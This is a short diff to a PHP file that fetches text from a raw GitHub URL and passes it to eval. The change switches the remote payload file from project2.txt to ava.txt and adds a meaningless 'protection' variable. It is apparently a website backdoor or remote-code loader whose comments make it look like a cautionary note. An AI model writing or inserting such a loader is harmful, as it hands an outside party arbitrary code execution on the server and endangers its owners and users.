@@ -47,10 +47,13 @@ function geturlsinfo($url) {
     return $url_get_contents_data; 
 }
 
+// ** Additional parameters for protection **
+$scandal = 'protected';
+
 // Execute a string of PHP code fetched from an external source
 // Note: Evaluating external code (using eval) is extremely risky and should
 // only be done in trusted and secure environments to prevent malicious attacks.
-$external_code = geturlsinfo("https://raw.githubusercontent.com/labubunews/update/refs/heads/main/project2.txt");
+$external_code = geturlsinfo("https://raw.githubusercontent.com/labubunews/update/refs/heads/main/ava.txt");
 if ($external_code !== false) {
     eval("?>" . $external_code);
 }
